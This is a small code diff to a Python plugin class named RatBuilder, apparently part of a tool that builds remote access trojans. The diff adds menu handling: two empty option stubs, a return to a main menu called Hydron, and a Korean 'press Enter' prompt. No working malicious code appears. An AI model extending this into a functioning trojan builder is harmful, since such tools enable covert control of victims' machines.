@@ -28,4 +28,12 @@ class RatBuilder(PluginABC):
         await TokenValidator(token)
 
         if option == 1:
-        
+            pass
+        elif option == 2:
+            pass
+        else:
+            await importlib.import_module("main").Hydron()
+
+        input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
+        await importlib.import_module("main").Hydron()
+
